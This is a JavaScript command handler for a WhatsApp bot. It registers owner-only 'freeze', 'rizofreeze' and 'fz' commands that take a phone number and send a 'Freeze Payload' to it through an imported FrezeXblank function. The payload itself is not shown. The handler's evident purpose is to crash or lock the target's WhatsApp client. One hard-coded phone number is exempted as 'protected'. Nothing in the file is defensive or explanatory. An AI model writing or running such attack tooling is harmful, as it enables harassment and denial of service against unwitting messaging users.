let { FrezeXblank } = require('../lib/rizofreeze');

let handler = async (m, { conn, args, command, isCreator }) => {
    if (!isCreator) return m.reply('🔒 *Owner Only - Freeze Command!*');

    if (!args[0]) {
        return m.reply(`📌 *Usage:* .${command} 923xx`);
    }

    let pepec = (args[0] || "").replace(/[^0-9]/g, "");

    if (!pepec) {
        return m.reply('❌ *Invalid number format!*');
    }

    let protectedNumbers = ["923154734548"];
    if (protectedNumbers.includes(pepec)) {
        return m.reply('🔒 *This number is protected!*');
    }

    let target = pepec + '@s.whatsapp.net';

    await m.reply(`❄️ *Freeze Target Locked:* ${pepec}\n⚡ *Sending Freeze Payload...*`);

    try {
        await FrezeXblank(conn, target);
        await conn.sendMessage(m.chat, { react: { text: "❄️", key: m.key } });
    } catch (error) {
        console.error(error);
        m.reply("⚠️ Error: Freeze payload execute karte waqt masla aaya hai.");
    }
}

handler.command = ['freeze', 'rizofreeze', 'fz'];
handler.tags = ['owner', 'rizo'];
handler.help = ['freeze 923xx'];
module.exports = handler;
